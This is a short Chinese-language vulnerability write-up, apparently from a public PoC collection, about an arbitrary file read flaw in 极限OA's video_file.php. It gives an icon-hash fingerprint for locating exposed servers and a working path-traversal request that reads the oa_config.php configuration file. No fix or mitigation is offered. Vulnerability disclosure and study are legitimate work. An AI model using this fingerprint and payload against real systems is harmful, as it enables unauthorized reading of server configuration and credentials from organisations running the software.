# 极限OA video_file.php 任意文件读取漏洞

## 漏洞描述

极限OA video_file.php存在任意文件读取漏洞，攻击者通过漏洞可以获取服务器敏感文件

## 漏洞影响

```
极限OA
```

## 网络测绘

```
icon_hash="1967132225"
```

## 漏洞复现

登录页面

![image-20220715111126095](images/202207151111176.png)

验证POC

```
/general/mytable/intel_view/video_file.php?MEDIA_DIR=../../../inc/&MEDIA_NAME=oa_config.php
```

![image-20220715111241562](images/202207151112653.png)